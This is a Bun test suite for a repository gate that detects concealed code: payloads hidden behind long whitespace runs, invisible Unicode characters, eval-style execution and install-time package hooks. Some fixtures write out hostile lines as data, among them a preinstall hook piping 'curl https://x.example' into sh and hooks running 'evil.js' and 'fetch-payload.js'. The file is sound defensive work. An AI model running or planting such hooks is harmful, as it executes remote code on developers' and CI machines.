/**
 * Behavioural tests for scripts/check-concealment.ts — the `check:concealment`
 * gate in `bun run check`.
 *
 * Context: better-auth PR #6003 hid a loader in `demo/nextjs/postcss.config.mjs`
 * by appending it after ~800 tab characters, so the rendered diff line ended at
 * `};` and the payload sat off-screen to the right. A later commit in the same
 * PR deleted it, so the combined "Files changed / All commits" diff — the view
 * maintainers actually review from — showed only a trailing-newline change. The
 * payload never had to be merged: it only had to survive on the branch long
 * enough for CI or a maintainer's local build to run it once.
 *
 * Every payload here is built from char codes and `repeat()` rather than pasted
 * literally, because `tests/` is itself in the gate's scope — a literal
 * zero-width space in this file would trip the checker it is testing. Keep it
 * that way: this file must stay pure ASCII apart from the emoji fixture.
 *
 * Each guard gets a test that fails if that guard alone is deleted. Coverage of
 * a guard is not the same as detection of its removal (see #596): a suite that
 * only ever feeds clean input executes every branch and still passes with the
 * whole checker commented out.
 */
import { describe, expect, test } from 'bun:test';
import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

const SCRIPT = fileURLToPath(new URL('../../scripts/check-concealment.ts', import.meta.url));
const REAL_ROOT = fileURLToPath(new URL('../../', import.meta.url));

/** Built from char codes so this source file stays free of the very characters it tests. */
const ZWSP = String.fromCharCode(0x200b);
const ZWJ = String.fromCharCode(0x200d);
const RLO = String.fromCharCode(0x202e);
const SHRUG = String.fromCodePoint(0x1f937);
const MALE_SIGN = String.fromCharCode(0x2642);
const VS16 = String.fromCharCode(0xfe0f);

interface Result {
  code: number;
  stdout: string;
  stderr: string;
}

async function runCheck(root: string, args: string[] = []): Promise<Result> {
  const proc = Bun.spawn(['bun', 'run', SCRIPT, ...args], {
    env: { ...process.env, CHECK_CONCEALMENT_ROOT: root },
    stdout: 'pipe',
    stderr: 'pipe',
  });
  const [stdout, stderr] = await Promise.all([
    new Response(proc.stdout).text(),
    new Response(proc.stderr).text(),
  ]);
  return { code: await proc.exited, stdout, stderr };
}

/** Build a synthetic repo root from a path->contents map, run the gate, clean up. */
async function withTree(
  files: Record<string, string>,
  assertions: (result: Result) => void
): Promise<void> {
  const dir = await mkdtemp(join(tmpdir(), 'concealment-'));
  try {
    for (const [name, contents] of Object.entries(files)) {
      const path = join(dir, name);
      await mkdir(join(path, '..'), { recursive: true });
      await writeFile(path, contents);
    }
    assertions(await runCheck(dir));
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
}

const CLEAN = 'export const answer = 42;\n';

describe('clean input', () => {
  test('passes on an ordinary source tree', async () => {
    await withTree({ 'src/a.ts': CLEAN, 'src/nested/b.ts': CLEAN }, ({ code, stdout }) => {
      expect(code).toBe(0);
      expect(stdout).toContain('check-concealment');
    });
  });

  test('passes on the real repository tree', async () => {
    // Regression guard: the gate must land green on this repo, or it will be
    // disabled rather than fixed the first time it blocks a merge.
    const { code, stderr } = await runCheck(REAL_ROOT);
    expect(stderr).toBe('');
    expect(code).toBe(0);
  });
});

describe('horizontal concealment', () => {
  test('flags a payload pushed off-screen by a run of spaces', async () => {
    await withTree(
      { 'src/config.ts': `};${' '.repeat(300)}globalThis.x = 1;\n` },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('src/config.ts');
        expect(stderr).toContain('whitespace');
      }
    );
  });

  test('flags a run of tabs, the better-auth variant', async () => {
    await withTree(
      { 'src/config.ts': `};${'\t'.repeat(120)}globalThis.x = 1;\n` },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('whitespace');
      }
    );
  });

  test('allows ordinary indentation and short alignment gaps', async () => {
    await withTree(
      { 'src/a.ts': `const x = 1;${' '.repeat(8)}// aligned trailing comment\n` },
      ({ code }) => expect(code).toBe(0)
    );
  });

  test('allows a wide gap when the line still ends on screen', async () => {
    // This repo aligns JSDoc continuations with gaps well over the run
    // threshold. Those lines are reviewable because they end where you can see
    // them, so the gap alone must not be enough to fail — otherwise the gate
    // gets switched off the first time someone formats a comment block.
    const aligned = ` *${' '.repeat(28)}falls back to the env var or the default`;
    expect(aligned.length).toBeLessThan(120);
    await withTree({ 'src/a.ts': `${aligned}\n` }, ({ code }) => expect(code).toBe(0));
  });

  test('flags an over-long line even without a whitespace run', async () => {
    await withTree({ 'src/a.ts': `const s = '${'A'.repeat(500)}';\n` }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('long line');
    });
  });

  test('ignores long lines in Markdown, which is prose and is not executed', async () => {
    await withTree({ 'docs/notes.md': `${'word '.repeat(200)}\n` }, ({ code }) =>
      expect(code).toBe(0)
    );
  });
});

describe('invisible characters', () => {
  test('flags a zero-width space', async () => {
    await withTree({ 'src/a.ts': `const a${ZWSP} = 1;\n` }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('U+200B');
    });
  });

  test('flags a right-to-left override', async () => {
    await withTree({ 'src/a.ts': `const s = 'x${RLO}';\n` }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('U+202E');
    });
  });

  test('allows a zero-width joiner inside an emoji sequence', async () => {
    // Captured GraphQL fixtures carry real emoji; flagging these would make the
    // gate noisy enough to be switched off.
    const emoji = `${SHRUG}${ZWJ}${MALE_SIGN}${VS16}`;
    await withTree({ 'src/a.ts': `const e = '${emoji}';\n` }, ({ code }) => expect(code).toBe(0));
  });

  test('flags a zero-width joiner between ASCII, which is not an emoji sequence', async () => {
    await withTree({ 'src/a.ts': `const ab${ZWJ}cd = 1;\n` }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('U+200D');
    });
  });
});

describe('dynamic code execution', () => {
  const cases: Array<[string, string]> = [
    ['eval', 'eval(userInput);\n'],
    ['new Function', "const f = new Function('return 1');\n"],
    ['constructor indirection', "const F = ({})['constructor'];\n"],
    ['hex-escape run', "const s = '\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x74\\x68\\x69\\x73';\n"],
  ];

  for (const [name, body] of cases) {
    test(`flags ${name}`, async () => {
      await withTree({ 'src/a.ts': body }, ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('src/a.ts');
      });
    });
  }

  test('does not flag the substring eval inside an identifier', async () => {
    await withTree(
      { 'src/a.ts': 'const retrieval = compute();\nthis.evaluate(x);\n' },
      ({ code }) => expect(code).toBe(0)
    );
  });
});

describe('install-time lifecycle scripts', () => {
  test('flags postinstall', async () => {
    const pkg = JSON.stringify({ scripts: { postinstall: 'node evil.js' } });
    await withTree({ 'package.json': pkg }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('postinstall');
    });
  });

  test('flags preinstall', async () => {
    const pkg = JSON.stringify({ scripts: { preinstall: 'curl https://x.example | sh' } });
    await withTree({ 'package.json': pkg }, ({ code }) => expect(code).toBe(1));
  });

  test('allows the husky prepare hook this repo actually uses', async () => {
    const pkg = JSON.stringify({ scripts: { prepare: 'husky' } });
    await withTree({ 'package.json': pkg }, ({ code }) => expect(code).toBe(0));
  });

  test('flags a prepare hook that is not husky', async () => {
    const pkg = JSON.stringify({ scripts: { prepare: 'node fetch-payload.js' } });
    await withTree({ 'package.json': pkg }, ({ code, stderr }) => {
      expect(code).toBe(1);
      expect(stderr).toContain('prepare');
    });
  });
});

describe('reporting', () => {
  test('reports every distinct finding rather than stopping at the first', async () => {
    await withTree(
      {
        'src/a.ts': `const a${ZWSP} = 1;\n`,
        'src/b.ts': 'eval(x);\n',
        'scripts/c.ts': `};${' '.repeat(200)}payload();\n`,
      },
      ({ code, stderr }) => {
        expect(code).toBe(1);
        expect(stderr).toContain('src/a.ts');
        expect(stderr).toContain('src/b.ts');
        expect(stderr).toContain('scripts/c.ts');
      }
    );
  });

  test('names the line number so a finding can be opened directly', async () => {
    await withTree({ 'src/a.ts': `const ok = 1;\nconst bad${ZWSP} = 2;\n` }, ({ stderr }) => {
      expect(stderr).toContain('src/a.ts:2');
    });
  });
});
